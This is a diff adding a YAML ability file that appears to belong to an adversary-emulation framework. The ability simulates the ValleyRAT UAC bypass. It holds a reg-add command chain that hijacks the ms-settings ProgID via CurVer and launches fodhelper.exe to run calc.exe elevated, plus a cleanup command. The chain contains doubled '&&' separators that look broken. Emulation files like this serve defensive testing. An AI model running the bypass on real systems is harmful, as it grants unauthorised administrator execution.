@@ -1,0 +1,22 @@
+---
+- id: f45c090ccf75d0fcc18f8d1c2abdb6ea
+  name: UAC bypassed by Utilizing ProgIDs registry.
+  description: 'This atomic designed to simulate the UAC bypassed made by ValleyRAT
+    by adding customized ProgIDs registry entry.
+
+    '
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"
+          /ve /d "C:\Windows\System32\calc.exe" /f &&  && reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"
+          /ve /d ".pwn" /f &&  && echo Triggering fodhelper.exe for potential privilege
+          escalation... && start fodhelper.exe
+        payloads: []
+        cleanup: reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"
+          /ve /f && reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"
+          /ve /f
